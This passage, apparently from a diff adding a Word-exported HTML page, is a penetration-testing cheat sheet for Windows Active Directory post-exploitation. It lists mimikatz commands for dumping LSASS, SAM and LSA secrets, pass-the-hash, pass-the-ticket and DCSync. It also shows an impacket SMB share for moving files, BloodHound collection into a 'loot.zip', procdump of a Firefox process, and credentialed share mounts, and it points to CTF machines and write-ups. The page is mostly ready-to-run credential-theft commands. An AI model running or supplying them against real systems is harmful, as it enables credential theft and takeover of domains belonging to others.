+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz privilege::debug&nbsp;</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz token::elevate</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz sekurlsa::logonpasswords</p>
+
+<p class=MsoNormal><b>#(Over) Pass The Hash</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz privilege::debug&nbsp;</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz sekurlsa::pth /user: /ntlm:&lt;&gt; /domain:</p>
+
+<p class=MsoNormal><b>#List all available kerberos tickets in memory</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz sekurlsa::tickets&nbsp;</p>
+
+<p class=MsoNormal><b>#Dump local Terminal Services credentials&nbsp;</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz sekurlsa::tspkg&nbsp;</p>
+
+<p class=MsoNormal><b>#Dump and save LSASS in a file</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz sekurlsa::minidump c:\temp\lsass.dmp&nbsp;</p>
+
+<p class=MsoNormal><b>#List cached MasterKeys</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz sekurlsa::dpapi&nbsp;</p>
+
+<p class=MsoNormal><b>#List local Kerberos AES Keys</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz sekurlsa::ekeys&nbsp;</p>
+
+<p class=MsoNormal><b>#Dump SAM Database</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz lsadump::sam&nbsp;</p>
+
+<p class=MsoNormal><b>#Dump SECRETS Database</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz lsadump::secrets&nbsp;</p>
+
+<p class=MsoNormal><b>#Inject and dump the Domain Controller’s Credentials</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz privilege::debug&nbsp;</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz token::elevate&nbsp;</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz lsadump::lsa /inject&nbsp;</p>
+
+<p class=MsoNormal><b>#Dump the Domain’s Credentials without touching DC’s
+LSASS and also remotely</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz lsadump::dcsync /domain: /all #List and Dump local kerberos
+credentials</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz kerberos::list /dump&nbsp;</p>
+
+<p class=MsoNormal><b>#Pass The Ticket</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz kerberos::ptt&nbsp;</p>
+
+<p class=MsoNormal><b>#List TS/RDP sessions&nbsp;</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz ts::sessions&nbsp;</p>
+
+<p class=MsoNormal><b>#List Vault credentials</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>mimikatz vault::list</p>
+
+<p class=MsoNormal><b>#One Liner Mimikatz - this is if you do not have a fully
+interactive shell</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>.\mimikatz &quot;privilege::debug&quot;
+&quot;sekurlsa::logonpasswords&quot; exit</p>
+
+<h1>&nbsp;</h1>
+
+<h1><a name="_Toc125793910"><span style='background:silver'>Smb server</span></a></h1>
+
+<p class=MsoNormal>Refer to the cheatsheets for syntax</p>
+
+<pre style='margin-left:36.0pt;text-indent:-18.0pt'><span style='font-family:
+"Calibri",sans-serif;color:black'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span
+style='font-size:16.5pt;font-family:"Helvetica",sans-serif;color:black'>impacket-smbserver -smb2support -username guest -password guest share /home/kali/doozy</span></pre>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<h1><a name="_Toc125793911"><span style='background:silver'>Bloodhound/neo4j/sharphound/bloodhound.py</span></a></h1>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>So bloodhound and neo4j work together and provides a GUI interface</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Start both: bloodhound and neo4j console (provide the creds)</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Sharphound is run on windows</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Bloodhound.py is run from Linux </p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Both Sharphound and bloodyhound.py provide zip files to be uploaded to
+bloodhound gui</p>
+
+<p class=MsoNormal><b>Invoking Bloodhound on windows:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local
+-ZipFileName loot.zip</p>
+
+<p class=MsoListParagraphCxSpLast>&nbsp;</p>
+
+<h1><a name="_Toc125793912"><span style='background:silver'>Winpeas script</span></a></h1>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Upload to any windows box and run</p>
+
+<p class=MsoListParagraphCxSpLast>&nbsp;</p>
+
+<h1><a name="_Toc125793913"><span style='background:silver'>Mounting a drive</span></a></h1>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>go to cd /mnt and create same name directories as smb dir</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>sudo mount -t cifs //ip/sharename /mnt/sharenamecopy</p>
+
+<p><strong><span style='font-size:16.5pt;font-family:"Helvetica",sans-serif;
+color:black'>with creds:</span></strong></p>
+
+<p style='margin-left:36.0pt;text-indent:-18.0pt;font-variant-ligatures: normal;
+font-variant-caps: normal;orphans: 2;text-align:start;widows: 2;-webkit-text-stroke-width: 0px;
+text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;
+word-spacing:0px'><span style='font-size:13.5pt;font-family:"Calibri",sans-serif;
+color:black'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span style='font-size:16.5pt;font-family:"Helvetica",sans-serif;
+color:black'>sudo mount -t cifs -o 'username=joe,password=joe1' //IP/users
+/mnt/usernameofperson</span></p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<h1><a name="_Toc125793914"><span style='background:silver'>Procdump</span></a></h1>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>upload procdump.exe C:\Users\Chase\Desktop\procdump.exe</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>get-process -name firefox (as you need the ID)</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>.\procdump.exe -ma 5992 firefox.dmp</p>
+
+<p class=MsoListParagraphCxSpLast>&nbsp;</p>
+
+<h1><a name="_Toc125793915"><span style='background:silver'>Reading config
+files</span></a></h1>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>cat &lt;filename&gt; | iconv -f UTF-16LE -t utf-8 ( there are other
+methods)</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<h1><a name="_Toc125793916">Write ups using these tools:</a></h1>
+
+<p class=MsoNormal><a
+href="https://medium.com/@navkang/active-directory-enumeration-and-exploitation-for-beginners-604a32f45011">https://medium.com/@navkang/active-directory-enumeration-and-exploitation-for-beginners-604a32f45011</a></p>
+
+<p class=MsoNormal>https://medium.com/@navkang/attacking-kerberos-e2b1be3dbbe9</p>
+
+<p class=MsoNormal><a
+href="https://medium.com/@navkang/post-exploitation-windows-ad-2e608c7858dc">https://medium.com/@navkang/post-exploitation-windows-ad-2e608c7858dc</a></p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<h1><a name="_Toc125793917">CTFs using these tools:</a></h1>
+
+<p class=MsoNormal>Check out ippsec rocks website</p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>forest, sauna, sizzle</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+</div>
+
+</body>
+
+</html>
